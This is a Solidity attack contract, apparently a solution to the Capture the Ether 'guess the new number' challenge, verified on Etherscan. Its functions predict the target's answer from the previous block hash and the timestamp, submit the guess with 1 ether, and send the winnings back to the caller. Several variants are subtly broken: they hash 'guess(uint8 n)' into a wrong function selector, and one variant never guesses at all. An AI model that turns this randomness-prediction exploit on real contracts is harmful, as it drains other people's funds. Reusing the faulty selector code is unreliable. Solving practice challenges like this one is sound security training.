/**
 *Submitted for verification at Etherscan.io on 2022-04-04
*/

pragma solidity ^0.4.21;

interface GuessTheNewNumberChallenge {
    function isComplete() external returns (bool);
    function guess(uint8 n) external payable;
    function guess2(uint8 n) external payable;
}

contract Hack {
    function Hack() public {
    }

    function checkComp(address addr) public view returns (bool){
        return GuessTheNewNumberChallenge(addr).isComplete();
    }

    function GetNum() public view returns (uint8){
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        return answer;
    }

    function GuessOther(address addr) public payable {
        require(msg.value > 1 ether);
        GuessTheNewNumberChallenge(addr).guess.value(1 ether)(GetNum());
        msg.sender.transfer(address(this).balance);
    }

    function GuessOther2(address addr) public payable {
        require(msg.value > 1 ether);
        GuessTheNewNumberChallenge(addr).guess(GetNum());
        msg.sender.transfer(address(this).balance);
    }
    
    function GuessOther3(address addr) public payable {
        require(msg.value > 1 ether);
        GuessTheNewNumberChallenge(addr).isComplete();
        msg.sender.transfer(address(this).balance);
    }
    
    function GuessOther4(address addr) public payable {
        require(msg.value > 1 ether);
        bool ok = addr.call(bytes4(keccak256("guess(uint8 n)")), GetNum());
        msg.sender.transfer(address(this).balance);
    }

    function GuessOther5(address addr) public payable {
        require(msg.value > 1 ether);
        bool ok = (address(addr)).call.value(1 ether)(bytes4(keccak256("guess(uint8 n)")), GetNum());
        msg.sender.transfer(address(this).balance);
    }
    
    function GuessOther6(address addr) public payable {
        require(msg.value > 1 ether);
        bool ok = addr.call(bytes4(keccak256("guess(uint8 n)")), GetNum());
        msg.sender.transfer(address(this).balance);
        require(ok);
    }

    function GuessOther7(address addr) public payable {
        require(msg.value > 1 ether);
        bool ok = (address(addr)).call.value(1 ether)(bytes4(keccak256("guess(uint8 n)")), GetNum());
        msg.sender.transfer(address(this).balance);
        require(ok);
    }
}